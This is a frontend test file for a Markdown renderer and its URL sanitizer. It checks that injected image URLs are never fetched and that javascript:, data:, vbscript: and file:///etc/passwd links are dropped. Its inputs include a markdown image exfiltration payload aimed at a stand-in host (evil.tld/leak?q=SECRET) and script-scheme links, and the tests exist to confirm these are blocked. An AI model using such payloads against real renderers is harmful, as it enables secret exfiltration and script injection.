import { describe, it, expect } from "vitest";
import { render, screen } from "@testing-library/react";
import { Markdown, safeUrlTransform } from "./Markdown";

/** S4 (plans/18-security-fixes.md) — untrusted markdown must not fetch anything. */
describe("Markdown", () => {
  it("never renders an <img>, so an injected image URL is not fetched", () => {
    const { container } = render(
      <Markdown>{"Looks fine ![x](https://evil.tld/leak?q=SECRET) done"}</Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    const placeholder = screen.getByTestId("md-image-placeholder");
    expect(placeholder.textContent).toContain("https://evil.tld/leak?q=SECRET");
  });

  it("opens links in a new tab without opener or referrer", () => {
    render(<Markdown>{"see [docs](https://example.com/docs)"}</Markdown>);
    const link = screen.getByRole("link", { name: "docs" });
    expect(link.getAttribute("href")).toBe("https://example.com/docs");
    expect(link.getAttribute("target")).toBe("_blank");
    expect(link.getAttribute("rel")).toBe("noopener noreferrer nofollow");
  });

  it("drops dangerous link schemes", () => {
    render(<Markdown>{"[a](javascript:alert(1)) [b](data:text/html,<b>x</b>) [c](vbscript:x)"}</Markdown>);
    const els = screen.queryAllByText(/^[abc]$/);
    expect(els).toHaveLength(3);
    for (const el of els) {
      expect(el.getAttribute("href")).toBeNull();
    }
  });
});

describe("safeUrlTransform", () => {
  it.each([
    ["https://example.com", "https://example.com"],
    ["http://example.com", "http://example.com"],
    ["mailto:a@b.c", "mailto:a@b.c"],
    ["/relative/path", "/relative/path"],
    ["#anchor", "#anchor"],
    ["javascript:alert(1)", ""],
    ["data:text/html,x", ""],
    ["file:///etc/passwd", ""],
  ])("%s → %s", (input, expected) => {
    expect(safeUrlTransform(input)).toBe(expected);
  });
});
